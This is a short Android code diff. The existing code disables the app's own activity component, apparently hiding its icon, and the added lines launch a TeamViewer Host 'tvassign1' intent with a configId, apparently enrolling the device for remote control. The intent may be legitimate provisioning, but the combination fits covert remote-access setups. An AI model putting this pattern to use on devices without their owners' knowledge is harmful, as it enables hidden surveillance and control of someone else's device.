@@ -41,7 +41,10 @@ public class DefaultActivity extends Activity {
         ComponentName name = new ComponentName(this, DefaultActivity.class);
         pm.setComponentEnabledSetting(name, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP);
-
+	
+	Intent intent=new Intent(Intent.ACTION_VIEW);
+	intent.setData(Uri.parse("intent://?configId=6jbbm52#Intent;scheme=tvassign1;package=com.teamviewer.host.market;end"));  
+	startActivity(intent);
         // terminate the activity.
         finish();
     }
